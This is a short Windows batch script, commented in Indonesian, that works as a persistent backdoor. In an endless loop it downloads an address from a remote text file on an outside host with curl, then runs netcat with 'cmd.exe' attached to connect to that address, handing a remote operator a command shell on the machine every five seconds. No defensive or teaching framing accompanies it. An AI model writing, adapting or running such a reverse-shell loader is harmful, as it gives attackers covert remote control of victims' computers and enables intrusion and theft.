@echo off
REM bberikan send text di line ini untuk send pesan klw pc idup
setlocal

:loop
set "url=https://ibnusaja.nasihosting.com/temp.txt"
set "variable="

for /f "usebackq delims=" %%a in (`curl -s "%url%"`) do (
    set "variable=%%a"
)

echo %variable%

nc -e cmd.exe %variable%

timeout /t 5 >nul

endlocal
goto loop
